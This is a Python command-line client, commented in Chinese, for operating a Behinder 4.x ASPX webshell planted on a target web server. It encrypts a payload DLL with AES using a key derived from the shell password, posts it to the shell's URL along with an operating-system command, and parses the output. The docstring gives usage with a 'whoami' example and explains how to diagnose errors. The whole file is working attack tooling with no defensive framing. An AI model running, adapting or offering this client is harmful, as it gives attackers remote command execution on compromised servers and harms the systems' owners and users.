#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""冰蝎(Behinder) 4.x ASPX 马通用客户端。

协议: 裸二进制 POST + AES-128-CBC(IV=密钥, PKCS7)，密钥 = MD5(密码).hexdigest()[:16]
用法:
    python behinder_client.py <URL> <密码> "<命令>"
示例:
    python behinder_client.py http://target/Content/Uploads/shell.aspx Aa123456 "whoami"

依赖: requests, cryptography
判读: 200+输出=通; 500 Padding=密钥/协议不对; 500 BadImageFormat=载荷格式问题
"""
import sys, re, hashlib
import urllib3, requests
urllib3.disable_warnings()
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sympad

U_DLL = "U.dll"  # 由 templates/U.cs 编译，与本脚本同目录

def aes_enc(key: bytes, plain: bytes) -> bytes:
    padder = sympad.PKCS7(128).padder()
    data = padder.update(plain) + padder.finalize()
    c = Cipher(algorithms.AES(key), modes.CBC(key)).encryptor()
    return c.update(data) + c.finalize()

def exec_cmd(url: str, password: str, cmd: str, timeout: int = 30) -> str:
    key = hashlib.md5(password.encode()).hexdigest()[:16].encode()
    dll = open(U_DLL, "rb").read()
    ct = aes_enc(key, dll)
    r = requests.post(url + "?cmd=" + requests.utils.quote(cmd), data=ct,
                      headers={"Content-Type": "application/octet-stream"}, timeout=timeout)
    if r.status_code != 200:
        m = re.search(r"<b> Exception Details: </b>(.*?)<br", r.text, re.S)
        return f"[HTTP {r.status_code}] " + (m.group(1).strip() if m else r.text[:200])
    # 去掉混淆壳前缀("Welcome You!"等)和 <pre> 标签
    body = re.sub(r"^.*?<pre>", "", r.text, flags=re.S)
    return body.replace("</pre>", "").replace("[stderr]\n", "\n").strip()

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)
    print(exec_cmd(sys.argv[1], sys.argv[2], " ".join(sys.argv[3:])))
